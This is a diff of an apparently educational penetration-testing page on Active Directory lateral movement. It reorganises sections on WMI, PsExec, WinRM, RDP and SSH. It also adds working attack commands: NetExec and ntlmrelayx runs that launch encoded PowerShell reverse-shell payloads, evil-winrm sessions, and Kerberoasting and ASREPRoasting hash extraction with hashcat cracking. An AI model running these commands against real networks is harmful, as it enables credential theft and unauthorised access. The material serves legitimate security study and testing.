@@ -8,7 +8,7 @@ description: Moving between computers by re-using accounts to get more access
 
 Some protocols allow running commands as a user on the computer when having valid credentials. This is useful because often different computers will contain different new secrets to escalate further into the domain, and eventually reach the Domain Admin.
 
-### WMI
+### WMI (135)
 
 The Windows Management Instrumentation (WMI) protocol works over port 135 and is used commonly for automating tasks. This is also useful for lateral movement, however, because it allows us to remotely run commands on another computer as a user:
 
@@ -29,51 +29,7 @@ The above method needs to be done from a PowerShell console on an already-compro
 nxc wmi $IP -u $USERNAME -p $PASSWORD -x 'powershell -e ...'
 ```
 
-### WinRM
-
-If your user is inside of the "Remote Management Users" group, this may be an option.&#x20;
-
-Windows Remote Management (WinRM) is another protocol built to execute commands remotely, this time allowing an interactive shell to be started as well. The commands are a little more complex in PowerShell, but we generate a password credential and start a session with that remotely:
-
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PS C:\> $secureString = ConvertTo-SecureString $PASSWORD -AsPlaintext -Force;
-PS C:\> $credential = New-Object System.Management.Automation.PSCredential $USERNAME, $secureString;
-
-# Run a single command
-PS C:\> $Options = New-CimSessionOption -Protocol DCOM
-PS C:\> $Session = New-Cimsession -ComputerName $IP -Credential $credential -SessionOption $Options
-<strong>PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine ="calc"};
-</strong>
-# Start an interactive shell
-<strong>PS C:\> New-PSSession -ComputerName $IP -Credential $credential
-</strong>PS C:\> Enter-PSSession 1
-[$IP]: PS C:\> whoami
-$DOMAIN\$USERNAME
-</code></pre>
-
-[NetExec](https://github.com/Pennyw0rth/NetExec) can also run commands to start a reverse-shell for example, if you don't have access to a compromised PowerShell shell. This is very similar to the WMI command:
-
-```
-nxc winrm $IP -u $USERNAME -p $PASSWORD -x 'powershell -e ...'
-```
-
-Lastly, there is the purpose-built `evil-winrm` tool that can start an interactive session remotely. It also supports extra commands in the shell like uploading/downloading and starting the connection using pass-the-hash or a private key certificate:
-
-{% embed url="https://github.com/Hackplayers/evil-winrm" %}
-Interactive WinRM shell with many useful extra features
-{% endembed %}
-
-<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ evil-winrm -i $IP -u $USERNAME -p $PASSWORD
-</strong>
-Evil-WinRM shell v3.3
-
-Info: Establishing connection to remote endpoint
-
-<strong>*Evil-WinRM* PS C:\> 
-</strong></code></pre>
-
-Read '[Basic Commands](https://github.com/Hackplayers/evil-winrm?tab=readme-ov-file#basic-commands)' to learn about the extra builtin commands like uploading/download, loading assemblies and bypassing AMSI all from inside the shell.
-
-### PsExec (SMB)
+### SMB - PsExec (139, 445)
 
 [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is part of Microsoft's Sysinternals suite and is made to easily run commands on a remote machine through an interactive console. The `.exe` provided implements the following steps on SMB:
 
@@ -124,6 +80,76 @@ Microsoft Windows [Version 10.0.20348.169]
 </strong>nt authority\system
 </code></pre>
 
+### WinRM (5985)
+
+If your user is inside of the **"Remote Management Users**" group, this may be an option.&#x20;
+
+Windows Remote Management (WinRM) is another protocol built to execute commands remotely, this time allowing an interactive shell to be started as well. The commands are a little more complex in PowerShell, but we generate a password credential and start a session with that remotely:
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PS C:\> $secureString = ConvertTo-SecureString $PASSWORD -AsPlaintext -Force;
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $USERNAME, $secureString;
+
+# Run a single command
+PS C:\> $Options = New-CimSessionOption -Protocol DCOM
+PS C:\> $Session = New-Cimsession -ComputerName $IP -Credential $credential -SessionOption $Options
+<strong>PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine ="calc"};
+</strong>
+# Start an interactive shell
+<strong>PS C:\> New-PSSession -ComputerName $IP -Credential $credential
+</strong>PS C:\> Enter-PSSession 1
+[$IP]: PS C:\> whoami
+$DOMAIN\$USERNAME
+</code></pre>
+
+[NetExec](https://github.com/Pennyw0rth/NetExec) can also run commands to start a reverse-shell for example, if you don't have access to a compromised PowerShell shell. This is very similar to the WMI command:
+
+```
+nxc winrm $IP -u $USERNAME -p $PASSWORD -x 'powershell -e ...'
+```
+
+Lastly, there is the purpose-built `evil-winrm` tool that can start an interactive session remotely. It also supports extra commands in the shell like uploading/downloading and starting the connection using pass-the-hash or a private key certificate:
+
+{% embed url="https://github.com/Hackplayers/evil-winrm" %}
+Interactive WinRM shell with many useful extra features
+{% endembed %}
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ evil-winrm -i $IP -u $USERNAME -p $PASSWORD
+</strong>
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+<strong>*Evil-WinRM* PS C:\> 
+</strong></code></pre>
+
+Read '[Basic Commands](https://github.com/Hackplayers/evil-winrm?tab=readme-ov-file#basic-commands)' to learn about the extra built-in commands like uploading/downloading, loading assemblies, and [#amsi-bypass](antivirus-evasion.md#amsi-bypass "mention") all from inside the shell.
+
+### RDP (3389)
+
+Remote Desktop Protocol is used very often by administrators and clients to use their Windows machine and configure it visually. When a user is in the "**Remote Desktop Users**" group, they can use this protocol on port 3389 to connect. There is no CLI-only option for this, only GUI.
+
+_Linux_ has a tool called [Remmina](https://remmina.org/) that you can add hosts to, and connect to via RDP.
+
+_Windows_ has this built-in with "Remote Desktop Connection" (mstsc.exe), which often works better because it is the official client, and supports copy-pasting across machines for example.
+
+{% hint style="info" %}
+**Tip**: Getting the domain correct can be a bit finicky, so try using [NetExec](https://github.com/Pennyw0rth/NetExec) with SMB to get it:
+
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ nxc smb $IP -u $USERNAME -p $PASSWORD
+</strong>SMB      $IP 445    MS01             [+] $DOMAIN\$USERNAME:$PASSWORD
+</code></pre>
+{% endhint %}
+
+### SSH (22)
+
+It might sound a bit unusual, but Windows machines can also host OpenSSH servers that allow you to connect via a terminal. These also don't require the user to be in any special group like [#winrm](lateral-movement.md#winrm "mention") or [#rdp](lateral-movement.md#rdp "mention"), so any user can log in with this. It simply requires a username and password:
+
+```bash
+sshpass -p $PASSWORD ssh $USERNAME@$IP
+```
+
+Shells like these are also very nice to work with, having command history and working arrow keys, as well as fast responses and flawless interactivity with programs you start.&#x20;
+
 ## Pass the Hash
 
 In Active Directory, having the NTLM hash of a user is **just as good as having their password**. This is due to the pass-the-hash attack where all verification uses the hash instead of the password (as seen in the [#authentication-flow](lateral-movement.md#authentication-flow "mention")). Most offensive tools allow a `-hashes` or `-H` argument to pass the hash and impersonate a user without knowing their password.&#x20;
@@ -153,7 +179,7 @@ Letting it listen with `sudo ntlmrelayx.py` a bunch of ports will be opened for 
 Another useful option is `-i` which will spawn a listener on every success for interactive tooling like  SMB or LDAP client where you can write commands yourself. \
 By default, the tool will perform useful actions like trying to execute files through SMB, or even adding a Domain Admin account if enough privileges are gained.&#x20;
 
-With the `-c` argument you can specify a custom command that it will execute if it is a local admin, otherwise, it dumps the SAM hashes in memory by default. Using `-t` as shown above you specify a single target, and `-tf` allows a target file containing all addresses it should try to relay to:
+With the `-c` argument you can specify a custom command that it will execute if it is a local admin, otherwise, it dumps the SAM hashes in memory by default. Using `-t` as shown above you specify a single target, and `-tf` specifies a target file containing all addresses it should try to relay to:
 
 ```bash
 sudo ntlmrelayx.py --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e ...'
@@ -275,7 +301,7 @@ Every **Service** on AD that requires Kerberos authentication registers a **Serv
 The first step can be done easily in BloodHound under the **Analysis** tab as **List all Kerberoastable Accounts**. \
 After which, you can use [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) from impacket to request a ticket and receive the crackable password hash.
 
-<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ GetUserSPNs.py 'DOMAIN/USER:PASSWORD' -request -outputfile kerberoast.hashes
+<pre class="language-shell-session" data-overflow="wrap"><code class="lang-shell-session"><strong>$ GetUserSPNs.py 'DOMAIN.COM/USER:PASSWORD' -request -outputfile kerberoast.hashes -dc-ip $DC
 </strong>...
 $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe42230300d56852c9eb$891ad31...b668c5ed
 </code></pre>
@@ -287,13 +313,25 @@ hashcat -m 13100 kerberoast.hashes /list/rockyou.txt
 ```
 
 {% hint style="info" %}
-**Note**: Complete domain credentials are not required for this attack to work. [ntlm.md](windows-authentication/ntlm.md "mention") hashes (using `-H`) or even for accounts vulnerable to [#asreproasting](lateral-movement.md#asreproasting "mention") ([implementation](https://github.com/fortra/impacket/pull/1413))
+**Note**: Complete domain credentials are not required for this attack to work. [ntlm.md](windows-authentication/ntlm.md "mention") hashes (using `-H`) or even for accounts vulnerable to [#asreproasting](lateral-movement.md#asreproasting "mention") ([reference](https://github.com/fortra/impacket/pull/1413))
 {% endhint %}
 
 ### ASREPRoasting
 
-This attack can be done by only speaking to the domain controller, not even a valid account is needed:
-
 {% embed url="https://www.thehacker.recipes/ad/movement/kerberos/asreproast" %}
 Abusing accounts without pre-authentication to receive hashes crackable offline
 {% endembed %}
+
+This attack can be done by speaking to the domain controller, not even a valid account is needed:
+
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># Without authentication
+<strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC '$DOMAIN/'
+</strong># With authentication
+<strong>GetNPUsers.py -request -format hashcat -outputfile asreproast.hashes -dc-ip $DC '$DOMAIN/$USERNAME:$PASSWORD'
+</strong></code></pre>
+
+Hashes resulting from this attack can then be cracked using [#hashcat](../cryptography/hashing/cracking-hashes.md#hashcat "mention"):
+
+```bash
+hashcat -m 18200 asreproast.hashes /list/rockyou.txt
+```
